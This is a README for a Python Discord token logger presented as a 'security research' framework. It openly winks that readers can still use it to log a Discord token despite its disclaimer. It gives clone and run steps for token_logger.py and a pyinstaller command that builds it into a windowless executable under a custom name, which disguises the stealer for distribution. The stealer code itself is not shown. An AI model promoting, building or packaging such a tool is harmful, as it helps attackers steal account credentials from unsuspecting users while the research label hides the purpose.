# Discord Security Research Tool

[![Python](https://img.shields.io/badge/Python-3.x-3776AB?logo=python\&logoColor=white)]()
[![Security Research](https://img.shields.io/badge/Focus-Security%20Research-8A2BE2)]()
[![Educational](https://img.shields.io/badge/Purpose-Educational-00C853)]()
[![Status](https://img.shields.io/badge/Status-Active-success)]()

> A Python-based Discord security research framework built to analyze credential-handling risks, simulate token-compromise scenarios, and improve awareness of Discord account security.

## Overview

This project was created as a controlled security research tool for studying how Discord authentication data can become exposed through malicious software, insecure environments, and poor credential-handling practices.

The framework is designed around **controlled simulations and defensive analysis**, making it suitable for cybersecurity research, malware-analysis labs, and educational environments.

## Research Areas

* 🔐 Discord authentication security
* 🧪 Controlled credential-compromise simulations
* 🔎 Security and malware analysis
* 🛡️ Detection and mitigation techniques
* 🐍 Python-based security tooling
* 📊 Credential exposure research
* ⚙️ Modular research architecture

## Purpose

The goal of this project is to better understand modern credential-stealing techniques from a **defensive security perspective** and demonstrate how compromised authentication data can put user accounts at risk.

All testing should be performed only on systems, accounts, and environments where you have explicit authorization.

## Disclaimer

This project is intended strictly for educational, research, and authorized security-testing purposes. Do not use it to access, collect, or compromise credentials belonging to other users.

(you can still use it to log a discord token dont worry!)

# How to Install

## Requirements

* Python 3.10 or newer
* Git
* Windows, Linux, or macOS

## Installation

1. Clone the repository:

```bash
git clone https://github.com/xiyzc/Discord-token-logger-in-python.git
cd Discord-token-logger-in-python
```

2. Create a virtual environment:

```bash
python -m venv venv
```

3. Activate the virtual environment.

**Windows:**

```bash
venv\Scripts\activate
```

**Linux / macOS:**

```bash
source venv/bin/activate
```

5. Start the application:

```bash
python token_logger.py
```

## How to a python file to a exe 

use the following command in powershell in the folder you have the logger in ! 
```bash
pyinstaller --onefile --noconsole --Name"Yourcustomname" token_logger.py
```
